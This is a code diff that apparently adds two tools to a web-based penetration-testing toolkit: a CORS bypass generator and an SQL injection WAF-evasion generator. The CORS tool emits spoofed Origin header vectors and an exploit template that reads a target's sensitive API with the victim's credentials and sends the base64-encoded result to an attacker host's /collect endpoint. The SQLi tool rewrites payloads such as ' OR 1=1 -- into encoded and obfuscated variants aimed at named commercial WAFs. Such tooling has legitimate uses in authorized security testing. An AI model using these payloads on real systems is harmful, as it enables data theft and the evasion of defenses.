@@ -811,3 +811,162 @@ function clearCurlBuilder(){
     const out = document.getElementById('curlOutput');
     if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
 }
+
+// =========================
+// CORS BYPASS GENERATOR
+// =========================
+
+function buildCorsGenerator(panel){
+    panel.innerHTML = `
+    ${toolHeader('', 'CORS Bypass Generator', 'Generate CORS bypass payloads and test vectors')}
+    <div class="tool-wrap">
+        <div class="tool-title">CORS Bypass Generator</div>
+        <label>Target Origin</label>
+        <input type="text" id="corsTarget" placeholder="https://target.com">
+        <label>Attacker Origin</label>
+        <input type="text" id="corsAttacker" placeholder="https://attacker.com">
+        <div class="button-group">
+            <button class="btn btn-run" onclick="runCorsGenerator()">Generate Payloads</button>
+            <button class="btn btn-outline" onclick="clearCors()">Clear</button>
+        </div>
+        ${createOutput('corsOutput', 'CORS Bypass Vectors')}
+    </div>
+    <div class="tool-wrap">
+        <div class="tool-title">CORS Bypass Techniques Reference</div>
+        ${[
+            ['Null Origin', 'Origin: null', 'Some servers accidentally allow sandboxed or null origins.'],
+            ['Subdomain Wildcard', 'Origin: https://evil.target.com', 'Useful when validation only checks for a suffix.'],
+            ['Pre-domain Match', 'Origin: https://target.com.evil.com', 'Useful when validation only checks for a prefix.'],
+            ['Case Variation', 'Origin: HTTPS://TARGET.COM', 'Tests brittle case-sensitive validation.'],
+            ['Trusted Subdomain XSS', 'XSS on trusted.target.com', 'A trusted vulnerable subdomain can inherit allowed origin trust.'],
+        ].map(([name, example, desc]) => `
+        <div style="padding:10px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:6px;">
+            <div style="color:var(--primary); font-weight:700; margin-bottom:4px;">${escapeHtml(name)}</div>
+            <code style="display:block; color:var(--text); font-size:12px; margin-bottom:4px;">${escapeHtml(example)}</code>
+            <div style="color:var(--muted); font-size:12px;">${escapeHtml(desc)}</div>
+        </div>`).join('')}
+    </div>`;
+}
+
+function runCorsGenerator(){
+    const target = document.getElementById('corsTarget').value.trim() || 'https://target.com';
+    const attacker = document.getElementById('corsAttacker').value.trim() || 'https://attacker.com';
+    const domain = target.replace(/^https?:\/\//i, '').replace(/\/.*/, '');
+    const attackerDomain = attacker.replace(/^https?:\/\//i, '').replace(/\/.*/, '');
+
+    const vectors = [
+        'Origin: null',
+        `Origin: ${attacker}`,
+        `Origin: https://${domain}.${attackerDomain}`,
+        `Origin: https://${attackerDomain}.${domain}`,
+        `Origin: https://evil.${domain}`,
+        `Origin: ${target}%60`,
+        `Origin: ${target}!`,
+        `Origin: ${target}.evil.com`,
+        `Origin: HTTPS://${domain.toUpperCase()}`,
+        `Origin: http://${domain}`,
+    ];
+
+    const exploit = `// Educational CORS test template
+fetch('${target}/api/sensitive', {
+  credentials: 'include'
+})
+  .then(response => response.text())
+  .then(data => {
+    return fetch('${attacker}/collect?data=' + encodeURIComponent(btoa(data)));
+  });`;
+
+    setOutput('corsOutput', `CORS origin test vectors:\n\n${vectors.join('\n')}\n\n${'-'.repeat(40)}\n\nExploit template:\n${exploit}`);
+}
+
+function clearCors(){
+    document.getElementById('corsTarget').value = '';
+    document.getElementById('corsAttacker').value = '';
+    const out = document.getElementById('corsOutput');
+    if(out) out.innerHTML = TOOL_PLACEHOLDER;
+}
+
+// =========================
+// SQLI WAF TAMPER
+// =========================
+
+function buildSqliTamper(panel){
+    panel.innerHTML = `
+    ${toolHeader('', 'SQLi WAF Tamper', 'Generate common WAF bypass variants for SQL injection payloads')}
+    <div class="tool-wrap">
+        <div class="tool-title">SQLi WAF Tamper Generator</div>
+        <label>SQL Payload</label>
+        <textarea id="sqliInput" placeholder="e.g. ' OR 1=1 --"></textarea>
+        <label>WAF Profile</label>
+        <select id="sqliWaf">
+            <option value="generic">Generic WAF</option>
+            <option value="modsec">ModSecurity</option>
+            <option value="cloudflare">Cloudflare</option>
+            <option value="aws">AWS WAF</option>
+        </select>
+        <div class="button-group">
+            <button class="btn btn-run" onclick="runSqliTamper()">Generate Bypass Variants</button>
+            <button class="btn btn-outline" onclick="clearSqliTamper()">Clear</button>
+        </div>
+        ${createOutput('sqliTamperOutput', 'WAF Bypass Variants')}
+    </div>
+    <div class="tool-wrap">
+        <div class="tool-title">WAF Bypass Techniques</div>
+        ${[
+            ['Case variation', "' Or 1=1 --", 'Mix uppercase and lowercase characters.'],
+            ['Comment injection', "' OR/**/1=1/**/--", 'Insert inline comments between keywords.'],
+            ['URL encoding', '%27%20OR%201%3D1%20--', 'Encode special characters.'],
+            ['Double URL encoding', '%2527%2520OR%25201%253D1', 'Encode an already encoded payload.'],
+            ['Whitespace substitutes', "' OR\\t1=1\\r\\n--", 'Use tabs, CR and LF instead of spaces.'],
+            ['Hex values', "' OR 0x31=0x31 --", 'Represent numbers or strings as hex.'],
+            ['HTTP parameter pollution', 'id=1&id=1 OR 1=1', 'Split payloads across duplicate parameters.'],
+        ].map(([name, example, desc]) => `
+        <div style="padding:8px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:4px;">
+            <div style="display:flex; gap:12px; align-items:flex-start;">
+                <div style="flex:1;">
+                    <div style="color:var(--primary); font-weight:600; font-size:13px; margin-bottom:2px;">${escapeHtml(name)}</div>
+                    <code style="font-size:12px; color:var(--text);">${escapeHtml(example)}</code>
+                    <div style="color:var(--muted); font-size:11px; margin-top:2px;">${escapeHtml(desc)}</div>
+                </div>
+                <button class="output-action-btn" onclick="copyText('${example.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}', this)">Copy</button>
+            </div>
+        </div>`).join('')}
+    </div>`;
+}
+
+function runSqliTamper(){
+    const payload = document.getElementById('sqliInput').value.trim();
+    if(!payload){ showToast('Enter a SQLi payload', 'error'); return; }
+
+    const variants = [
+        { name: 'Original', value: payload },
+        { name: 'Case mixed', value: payload.replace(/union/gi, 'UnIoN').replace(/select/gi, 'SeLeCt').replace(/where/gi, 'WhErE').replace(/or/gi, 'oR').replace(/and/gi, 'aNd') },
+        { name: 'Comment between tokens', value: payload.replace(/\s+/g, '/**/') },
+        { name: 'URL encoded', value: encodeURIComponent(payload) },
+        { name: 'Double URL encoded', value: encodeURIComponent(encodeURIComponent(payload)) },
+        { name: 'Tabs instead of spaces', value: payload.replace(/ /g, '\t') },
+        { name: 'Newlines instead of spaces', value: payload.replace(/ /g, '\n') },
+        { name: 'Plus instead of spaces', value: payload.replace(/ /g, '+') },
+        { name: 'Hex numbers', value: payload.replace(/\b(\d+)\b/g, number => '0x' + parseInt(number, 10).toString(16)) },
+        { name: 'HTML entities', value: payload.replace(/'/g, '&#39;').replace(/"/g, '&quot;') },
+        { name: 'PostgreSQL base64 wrapper', value: `CONVERT_FROM(DECODE('${btoa(payload)}','base64'),'UTF8')` },
+    ];
+
+    const html = variants.map(variant => `
+    <div style="padding:8px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:4px;">
+        <div style="display:flex; gap:10px; align-items:flex-start;">
+            <div style="flex:1;">
+                <div style="color:var(--primary); font-size:11px; margin-bottom:4px;">${escapeHtml(variant.name)}</div>
+                <div style="font-family:var(--font-mono); font-size:12px; word-break:break-all;">${escapeHtml(variant.value)}</div>
+            </div>
+            <button class="output-action-btn" onclick="copyText('${variant.value.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n')}', this)">Copy</button>
+        </div>
+    </div>`).join('');
+    setOutput('sqliTamperOutput', html, true);
+}
+
+function clearSqliTamper(){
+    document.getElementById('sqliInput').value = '';
+    const out = document.getElementById('sqliTamperOutput');
+    if(out) out.innerHTML = TOOL_PLACEHOLDER;
+}
